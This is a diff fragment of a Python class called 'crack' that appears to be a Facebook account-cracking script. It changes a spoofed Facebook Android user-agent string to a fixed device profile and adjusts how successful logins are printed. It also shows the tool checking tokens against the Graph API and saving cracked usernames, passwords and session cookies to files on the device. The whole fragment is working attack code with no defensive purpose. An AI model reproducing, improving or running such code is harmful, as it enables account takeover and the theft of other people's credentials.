@@ -856,7 +856,8 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(modelname41)+;FBBD/+str(modelname41)+;FBPN/+str(FBPN)+;FBDV/+str(model1)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
+                #ua_string = f'[F#BAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'%{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(mixmodel)+;FBBD/+str(mixmodel)+;FBPN/+str(FBPN)+;FBDV/+str(model4)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=1.0,width=1280,height=752};FBLC/en_US;FBCR/o2 - de;FBPN/com.facebook.katana;FBDV/Lenovo B8000-H;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
@@ -923,7 +924,7 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {ua_string} {VV}  ")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
                         #print(f"\#r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
                         open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "|" + pw + "|" + cokie + "	\n")
